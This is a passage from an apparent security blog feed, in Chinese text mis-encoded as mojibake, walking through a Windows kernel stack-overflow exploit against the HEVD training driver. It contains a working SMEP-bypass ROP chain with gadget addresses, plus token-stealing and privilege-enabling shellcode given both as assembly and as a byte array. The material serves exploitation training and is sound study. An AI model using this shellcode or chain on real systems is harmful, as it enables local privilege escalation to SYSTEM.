class="built_in">RtlCopyMemory</span>(space, shellcode_addr, <span class="number">0x100</span>);</span><br></pre></td></tr></table></figure><p>MSDNä¸­è¯´æ˜è¯¥ä¸¤ä¸ªå‡½æ•°åœ¨å†…æ ¸ä¸­å‡ä½äº<code> NtosKrnl.exe</code>é‡Œï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç¬¬ä¸€ç« çš„å†…å®¹å¯»æ‰¾åˆ°è¯¥åœ°å€ï¼Œå¯ä»¥ä½¿ç”¨CFF ExploreræŸ¥çœ‹å¯¼å‡ºè¡¨æ‰¾åˆ°å‡½æ•°</p><p><img src="https://img.joe1sn.top/uploads/big/866de1aad36e03df79f0a3f799ca2e72.png" alt="image-20240120143139338" /></p><p><img src="https://img.joe1sn.top/uploads/big/59a09be3f8b2929ced592f3a4901f054.png" alt="image-20240120143245405" /></p><p>éœ€è¦è¯´æ˜çš„ä¸€ç‚¹æ˜¯<code>ExAllocatePoolWithTag</code>æœ‰ä¸€ä¸ªå¾ˆæ¶å¿ƒçš„åœ°æ–¹å°±æ˜¯</p><p><img src="https://img.joe1sn.top/uploads/big/324967fd2b7f547949278ef9bfa00206.png" alt="image-20240120213553032" /></p><p>è¿™ä¸‰ä¸ªmovä¼šæ‰“ä¹±æˆ‘ä»¬ç²¾å¿ƒè®¾è®¡çš„ROPé“¾ï¼Œè€Œä¸”åé¢æ ¹æœ¬æ²¡æœ‰ä½¿ç”¨åˆ°ä»–ï¼Œæ‰€ä»¥è¦ç›´æ¥è¿›å…¥<code>push rdi</code>çš„ä½ç½®</p><p><code>RtlCopyMemory</code>å…¶å®æ˜¯ä¸€ä¸ªå®</p><p><img src="https://img.joe1sn.top/uploads/big/9bb79876c8b14924e6704969dc963280.png" alt="image-20240120155359370" /></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> base = <span class="built_in">ulGetKernelBase</span>((PCHAR)<span class="string">&quot;ntoskrnl.exe&quot;</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> ulExAllocatePoolWithTag = base + <span class="number">0x9B203F</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> ulRtlCopyMemory = base + <span class="number">0x40BEC0</span>;</span><br></pre></td></tr></table></figure><p>æ ¹æ®å¾®è½¯çš„å‡½æ•°è°ƒç”¨è§„åˆ™ï¼Œä¼ å‚é¡ºåºæ˜¯<code>rcx</code>ï¼Œ<code>rdx</code>ï¼Œ<code>r8</code>ï¼Œè¿”å›åœ°å‚æ•°åœ¨<code>rax</code>ä¸­</p><p>é‚£ä¹ˆä¸€ä¸ªç†æƒ³çš„ROPå¸ƒå±€</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pop rcx rdx r8 ret</span><br><span class="line">0</span><br><span class="line">0x100</span><br><span class="line">0xDEAD</span><br><span class="line">ExAllocatePoolWithTag</span><br><span class="line">---------------------------</span><br><span class="line">pop rcx rdx r8 ret</span><br><span class="line">0;æš‚æ—¶</span><br><span class="line">shellcode_addr</span><br><span class="line">0x100;</span><br><span class="line">mov rcx, rax ret;æ­¤æ—¶rcx = ExAllocatePoolWithTagè¿”å›åœ°å†…å­˜åœ°å€</span><br><span class="line">RtlCopyMemory</span><br><span class="line">---------------------------</span><br><span class="line">jmp rax</span><br></pre></td></tr></table></figure><p>å°±è¿™äº›gadgetä¸­çš„popä¼šæ¶ˆé™¤<code>rsp+0x28</code>çš„é©±åŠ¨çš„<code>Handle</code>å‡½æ•°è¿”å›åœ°å€ï¼Œæ‰€ä»¥é¦–å…ˆæ˜¯æŠ¬æ ˆï¼Œå¦‚<code>sub rsp, 0x100</code>ï¼Œåœ¨<code>jmp rax</code>ä¹‹å‰å¤šæ¬¡è°ƒç”¨<code>ret</code>æ¥æŠ¬å‡<code>rsp</code>çš„å€¼ï¼Œæœ€ç»ˆå›åˆ°<code>shellcode</code>è°ƒæ•´ä¸ºé€‚ç”¨çš„<code>rsp</code>å€¼ã€‚</p><p><strong>å®é™…æƒ…å†µä¸­ä¹Ÿä¸ä¼šæœ‰æ°å¥½çš„gadgetç”¨</strong></p><p>å®é™…ä¸Šèƒ½ç”¨çš„<code>mov rcx, rax</code>å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼å®ç°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x00000001408fa783 : push rax ; push rbx ; ret</span><br><span class="line">0x00000001408fa77b : push rax ; push rdi ; ret</span><br><span class="line">0x000000014020262C : pop rdi ; ret</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±èƒ½è®©rcx=raxäº†ï¼Œå¸ƒå±€åæ ˆçš„æƒ…å†µ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ulExAllocatePoolWithTag</span><br><span class="line">pop_rdi</span><br><span class="line">pop_rcx</span><br><span class="line">push_rax_rdi</span><br></pre></td></tr></table></figure><ol><li><code>pop rdi</code>ï¼š<code>RDI</code> =<code>pop rcxåœ°å€</code>ï¼Œå‡ºæ ˆä¸€ä¸ªï¼Œ<code>rsp</code>æŒ‡å‘<code>push_rax_rdi</code>ï¼Œç„¶å<code>ret</code>è·³è½¬åˆ°è¯¥åœ°å€</li><li><code>push rax</code>ï¼šå°†ç”³è¯·çš„å†…æ ¸å†…å­˜åœ°å€æ”¾åˆ°äº†æ ˆä¸Šï¼Œ<code>rsp</code>æŒ‡å‘å€¼å°±ä¸ºè¯¥å†…å­˜çš„åœ°å€</li><li><code>push rdi; ret</code>ï¼šç­‰æ•ˆäº<code>jmp rdi</code>ï¼Œäºæ˜¯<code>ret</code>åˆ°äº†<code>pop rcx</code></li><li><code>pop rcx</code>ï¼šæ­¤æ—¶çš„æ ˆé¡¶ä¸º 2 ä¸­å…¥æ ˆçš„<code>rax</code></li></ol><p><img src="https://img.joe1sn.top/uploads/big/28b0466a118932c4725e7f24168cef31.png" alt="image-20240120214435516" /></p><p>æˆåŠŸè®©<code>RCX=RAX</code></p><p><img src="https://img.joe1sn.top/uploads/big/68943ef85bb247fa007f3cfcc84cc1e2.png" alt="image-20240120214609588" /></p><p>è¿™é‡Œæš‚æ—¶è®¾è®¡payload</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//typedef unsigned long long funcaddr;</span></span><br><span class="line"></span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span>) = (funcaddr)pop_rcx;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">8</span>) = (funcaddr)<span class="number">0</span>;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x10</span>) = (funcaddr)pop_rdx;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x18</span>) = (funcaddr)<span class="number">0x100</span>;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x20</span>) = (funcaddr)pop_r8;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x28</span>) = (funcaddr)<span class="number">0xDEAD</span>;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x30</span>) = (funcaddr)ulExAllocatePoolWithTag;</span><br><span class="line"></span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x38</span>) = (funcaddr)pop_rdi;<span class="comment">//rsp = 0</span></span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x40</span>) = (funcaddr)pop_rcx;<span class="comment">//rdi = rcx --- been force to zero</span></span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x48</span>) = (funcaddr)push_rax_rdi;<span class="comment">//ret rdi: pop_rcx value changed</span></span><br><span class="line"></span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x50</span>) = (funcaddr)pop_rdx;<span class="comment">//æ­¤å¤„è¢«ä½ä½è¢«æ¸…é›¶</span></span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x58</span>) = (funcaddr)shellcode_addr; </span><br><span class="line"></span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x70</span>) = (funcaddr)pop_r8;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x78</span>) = (funcaddr)<span class="built_in">sizeof</span>(cmd);</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x80</span>) = (funcaddr)ulRtlCopyMemory;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x88</span>) = (funcaddr)jmp_rax;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿›è¡Œ<code>ExAllocatePoolWithTag</code></p><p><img src="https://img.joe1sn.top/uploads/big/bd6c315f3f534e5d95e65b69621299b0.png" alt="image-20240121084806324" /></p><p>æ‰“æ–­äº†ROPé“¾ï¼Œè®©<code>rsp+68</code>çš„ä½ç½®çš„ä½32ä½æ¸…é›¶äº†ï¼Œè¿™è®©æˆ‘ä»¬éœ€è¦è°ƒæ•´è¿™æ®µropé“¾</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x50</span>) = (funcaddr)pop_rdx;<span class="comment">//æ­¤å¤„è¢«ä½ä½è¢«æ¸…é›¶</span></span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x58</span>) = (funcaddr)shellcode_addr; </span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x60</span>) = (funcaddr)pop_rdx;<span class="comment">//æ¢å¤rdx</span></span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x68</span>) = (funcaddr)shellcode_addr;</span><br><span class="line">   </span><br><span class="line">   *(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x70</span>) = (funcaddr)pop_r8;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x78</span>) = (funcaddr)<span class="built_in">sizeof</span>(cmd);</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/bedc06d732b94afafa28a2688c0a94d6.png" alt="image-20240121093505807" /></p><p>åœ¨è®¾ç½®<code>CR4.SMEP</code>çš„æƒ…å†µä¸‹ï¼Œä¾é å†…æ ¸åˆ†é…çš„å†…å­˜ï¼ŒæˆåŠŸè¿è¡Œäº†shellcodeï¼ŒROPé“¾è¿›è¡Œäº†å¤šæ¬¡è°ƒç”¨ï¼Œè®©æœ€åshellcodeä¸­çš„<code>rsp</code>å€¼ä¸å¥½ä¼°è®¡ï¼Œå¹¶ä¸”æ ˆçš„æƒ…å†µå¯èƒ½éšç€å‡½æ•°çš„è°ƒç”¨å°†åŸæœ‰çš„å€¼æŠ¹å»ï¼Œ<strong>è¿™é‡Œå…ˆæŠŠshellcodeæ¢æˆä»TrapFrameè¿”å›çš„</strong></p><p><img src="https://img.joe1sn.top/uploads/big/39d57b872ac0473e469f8056ebedb9d3.png" alt="image-20240121095833438" /></p><h2 id="c-ä¼˜åŒ–shellcode"><a class="markdownIt-Anchor" href="#c-ä¼˜åŒ–shellcode"></a> C. ä¼˜åŒ–shellcode</h2><p>æ‰€ä»¥è¿™æ®µshellcodeå‚è€ƒshellcodeç¼–å†™çš„Cã€Déƒ¨åˆ†ï¼ŒåŠ ä¸Šäº†æ‰€æœ‰åŠŸèƒ½Enabledçš„shellcodeç‰‡æ®µ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">[Bits 64]</span><br><span class="line"></span><br><span class="line">_start:    </span><br><span class="line">    xor rax, rax</span><br><span class="line">    mov rax, gs:[rax + 0x188]</span><br><span class="line">    mov rax, [rax + 0xb8]     ;rax = å½“å‰EPROCESS</span><br><span class="line">    mov r9, rax               ;r9  = å½“å‰EPROCESS</span><br><span class="line">    mov rax, [rax + 0x448]    ;rax = å½“å‰EPROCESS.List</span><br><span class="line">    mov rax, [rax]            ;rax = å½“å‰EPROCESS.List-&gt;flink</span><br><span class="line"></span><br><span class="line">__loop:</span><br><span class="line">    mov rdx, [rax - 0x8]      ;rdx = ä¸Šä¸€ä¸ªè¿›ç¨‹çš„ upid</span><br><span class="line">    mov r8, rax               ;r8  = å½“å‰EPROCESS.List-&gt;flink</span><br><span class="line">    mov rax, [rax]            ;rax = ä¸Šä¸€ä¸ªè¿›ç¨‹çš„.List</span><br><span class="line">    cmp rdx, 0x4</span><br><span class="line">    jnz __loop</span><br><span class="line"></span><br><span class="line">    ;rdx = 4</span><br><span class="line">    ;r8 = System EPROCESS</span><br><span class="line"></span><br><span class="line">    mov rdx, [r8+0x70]      ;rdx = system token</span><br><span class="line">    and rdx, -0x8           ;æ¶ˆé™¤ä½4ä½</span><br><span class="line">    mov rcx, [r9+0x4b8]     ;å½“å‰EPROCESSçš„token</span><br><span class="line">    and rcx, 0x7            ;</span><br><span class="line">    add rdx, rcx            ;rdx = ç³»ç»Ÿtokené«˜ä½+å½“å‰tokenä½4ä½</span><br><span class="line">    mov [r9+0x4b8], rdx     ;å°†åˆæˆçš„tokenå¤åˆ¶ç»™å½“å‰</span><br><span class="line"></span><br><span class="line">    ;Enable ALL</span><br><span class="line">    mov rdx, [r8 + 0x70]      ;rdx = system token</span><br><span class="line">    and rdx, 0xFFFFFFFFFFFFFFF0           ;system token: æ¶ˆé™¤ä½8ä½ï¼Œä¾¿äºè§£æToken</span><br><span class="line">    mov rbx, [rdx + 0x40]     ;rbx = System tokençš„Present</span><br><span class="line">    mov rcx, [r9 + 0x4b8]     ;rcx = æ–°çš„EPROCESSçš„token</span><br><span class="line">    and rcx, 0xFFFFFFFFFFFFFFF0           ;new current token: æ¶ˆé™¤ä½8ä½ï¼Œä¾¿äºè§£æToken</span><br><span class="line">    mov [rcx + 0x40], rbx</span><br><span class="line">    mov [rcx + 0x48], rbx</span><br><span class="line"></span><br><span class="line">    mov     rax, gs:188h</span><br><span class="line">    mov     cx, [rax+1E4h]</span><br><span class="line">    inc     cx</span><br><span class="line">    mov     [rax+1E4h], cx</span><br><span class="line">    mov     rdx, [rax+90h]</span><br><span class="line">    mov     rcx, [rdx+168h]</span><br><span class="line">    mov     r11, [rdx+178h]</span><br><span class="line">    mov     rsp, [rdx+180h]</span><br><span class="line">    mov     rbp, [rdx+158h]</span><br><span class="line">    xor     eax, eax</span><br><span class="line">    swapgs</span><br><span class="line">    o64 sysret</span><br></pre></td></tr></table></figure><p>å¾—åˆ°shellcode</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> cmd[<span class="number">176</span>] = &#123;</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>,</span><br><span class="line"><span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0xB8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xC1</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>,</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x50</span>, <span class="number">0xF8</span>, <span class="number">0x49</span>,</span><br><span class="line"><span class="number">0x89</span>, <span class="number">0xC0</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xFA</span>, <span class="number">0x04</span>, <span class="number">0x75</span>, <span class="number">0xF0</span>, <span class="number">0x49</span>,</span><br><span class="line"><span class="number">0x8B</span>, <span class="number">0x50</span>, <span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xE2</span>, <span class="number">0xF8</span>, <span class="number">0x49</span>, <span class="number">0x8B</span>, <span class="number">0x89</span>, <span class="number">0xB8</span>, <span class="number">0x04</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xE1</span>, <span class="number">0x07</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xCA</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0x91</span>,</span><br><span class="line"><span class="number">0xB8</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x8B</span>, <span class="number">0x50</span>, <span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xE2</span>, <span class="number">0xF0</span>,</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x5A</span>, <span class="number">0x40</span>, <span class="number">0x49</span>, <span class="number">0x8B</span>, <span class="number">0x89</span>, <span class="number">0xB8</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>,</span><br><span class="line"><span class="number">0x83</span>, <span class="number">0xE1</span>, <span class="number">0xF0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x59</span>, <span class="number">0x40</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x59</span>, <span class="number">0x48</span>, <span class="number">0x65</span>,</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x04</span>, <span class="number">0x25</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x8B</span>, <span class="number">0x88</span>, <span class="number">0xE4</span>,</span><br><span class="line"><span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0xFF</span>, <span class="number">0xC1</span>, <span class="number">0x66</span>, <span class="number">0x89</span>, <span class="number">0x88</span>, <span class="number">0xE4</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x8A</span>, <span class="number">0x68</span>,</span><br><span class="line"><span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x4C</span>, <span class="number">0x8B</span>, <span class="number">0x9A</span>, <span class="number">0x78</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>,</span><br><span class="line"><span class="number">0xA2</span>, <span class="number">0x80</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0xAA</span>, <span class="number">0x58</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x0F</span>, <span class="number">0x01</span>, <span class="number">0xF8</span>, <span class="number">0x48</span>, <span class="number">0x0F</span>, <span class="number">0x07</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/92433bde7fdb3c57a079ce6037669523.png" alt="image-20240121200156534" /></p><p>ç¼ºç‚¹å°±æ˜¯ç¨‹åºæ— æ³•exité€€å‡ºï¼Œä¸è¿‡å¯ä»¥åœ¨shellcodeä¸­è®¾ç½®Tokenè¿ç§»ç­‰ä¸€äº›å…¶ä»–æ“ä½œï¼Œè¿™é‡Œå°±ä¸å±•å¼€äº†</p><h1 id="å‚è€ƒ"><a class="markdownIt-Anchor" href="#å‚è€ƒ"></a> å‚è€ƒ</h1><p><a href="https://wumb0.in/finding-the-base-of-the-windows-kernel.html">https://wumb0.in/finding-the-base-of-the-windows-kernel.html</a></p><p><a href="https://github.com/xct/windows-kernel-exploits">https://github.com/xct/windows-kernel-exploits</a></p><p><a href="https://connormcgarr.github.io/x64-Kernel-Shellcode-Revisited-and-SMEP-Bypass/">https://connormcgarr.github.io/x64-Kernel-Shellcode-Revisited-and-SMEP-Bypass/</a></p><p><a href="https://hshrzd.wordpress.com/2017/06/22/starting-with-windows-kernel-exploitation-part-3-stealing-the-access-token/">https://hshrzd.wordpress.com/2017/06/22/starting-with-windows-kernel-exploitation-part-3-stealing-the-access-token/</a></p><p><a href="https://mdanilor.github.io/posts/hevd-2/">https://mdanilor.github.io/posts/hevd-2/</a></p>]]></content>
    
    
    <summary type="html">&lt;hr /&gt;
&lt;p&gt;ä¸Šï¼š&lt;a href=&quot;https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-I/&quot;&gt;https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-I/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ä¸­ï¼š&lt;a href=&quot;https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-II/&quot;&gt;https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-II/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;æ–‡ç« å·²åœ¨å…ˆçŸ¥ç¤¾åŒºæŠ•ç¨¿ï¼š&lt;a href=&quot;https://xz.aliyun.com/t/13365&quot;&gt;https://xz.aliyun.com/t/13365&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="kernel" scheme="https://joe1sn.eu.org/tags/kernel/"/>
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
    <category term="pwn" scheme="https://joe1sn.eu.org/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>ä»é›¶æ¢ç´¢ç°ä»£windowså†…æ ¸æ ˆæº¢å‡º-ä»¥HEVDç»ƒä¹ ä¸ºä¾‹ï¼ˆä¸Šï¼‰</title>
    <link href="https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-I/"/>
    <id>https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-I/</id>
    <published>2024-01-25T07:07:29.000Z</published>
    <updated>2024-01-25T07:18:59.793Z</updated>
    
    <content type="html"><![CDATA[<p>å¼€å§‹åšHEVDæ¥ç†Ÿæ‚‰windowsçš„å†…æ ¸æ¼æ´åˆ©ç”¨æ–¹å¼æ—¶ï¼Œå‘ç°å¤§å¤šæ•°çš„èµ„æ–™ä¾æ—§åŸºäºwindows7ï¼Œä½†æ˜¯ç›®å‰ä¸»æµçš„æ“ä½œç³»ç»Ÿå·²ç»æ˜¯win10ï¼Œæ‰€ä»¥è¿˜æ˜¯å¾—æ›´ä¸Šæ—¶ä»£æ½®æµçš„</p><p>æ–‡ç« å·²åœ¨å…ˆçŸ¥ç¤¾åŒºæŠ•ç¨¿ï¼š<a href="https://xz.aliyun.com/t/13363">https://xz.aliyun.com/t/13363</a></p><span id="more"></span><h1 id="0-å‰ç½®ç¯å¢ƒ"><a class="markdownIt-Anchor" href="#0-å‰ç½®ç¯å¢ƒ"></a> 0. å‰ç½®ç¯å¢ƒ</h1><p>æ›´åŸºç¡€</p><ul><li>WIndows10 Vmwareè™šæ‹Ÿæœº</li><li>Visual Studio 2019ï¼Œæœ‰WDK</li><li>Windbg Previewï¼ˆæˆ‘ç”¨å•çº¯æ˜¯è§‰å¾—æ›´å¥½çœ‹ï¼‰</li><li>æœ€é‡è¦çš„HEVDé¡¹ç›®ï¼š<a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver%EF%BC%8C%E6%88%91%E7%9B%B4%E6%8E%A5%E4%B8%8B%E8%BD%BD%E7%9A%843.00">https://github.com/hacksysteam/HackSysExtremeVulnerableDriverï¼Œæˆ‘ç›´æ¥ä¸‹è½½çš„3.00</a> Releaseç‰ˆ</li></ul><p>æˆ‘ä½¿ç”¨çš„Windowsç‰ˆæœ¬æ˜¯</p><p><img src="https://img.joe1sn.top/uploads/big/a8c845560178af29a6b56e36c93a49cd.png" alt="image-20240122113406037" /></p><h2 id="i-ç¼–ç¨‹ç¯å¢ƒ"><a class="markdownIt-Anchor" href="#i-ç¼–ç¨‹ç¯å¢ƒ"></a> I. ç¼–ç¨‹ç¯å¢ƒ</h2><p><strong>å¦‚æœä½ æƒ³å¿«é€Ÿæ­å»ºä¸€ä¸ªé©±åŠ¨å¼€å‘ç¯å¢ƒå¯ä»¥å‚è€ƒBç«™ä¸Šçš„ä¸€äº›èµ„æ–™</strong>ï¼Œå¦‚ï¼š<a href="https://www.bilibili.com/video/BV1wY4y1n77F">é…ç½®é©±åŠ¨å¼€å‘ç¯å¢ƒ</a><br />å¦‚æœæŒ‰ç…§æ­¥éª¤vsæ²¡æœ‰<code>KernelModDriver</code>è¿™ä¸€æ¨¡æ¿ï¼Œæ‰¾åˆ°vsç›®å½•çš„<code>WDK.vsix</code>åŒå‡»å³å¯</p><p>ä¸€æ®µé©±åŠ¨çš„ä¸»è¦ä»£ç ï¼Œåœ¨<code>main.cpp</code>ä¸­ç¼–å†™</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntifs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;win10.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;x64.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">VOID</span></span><br><span class="line"><span class="function"><span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT DriverObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span 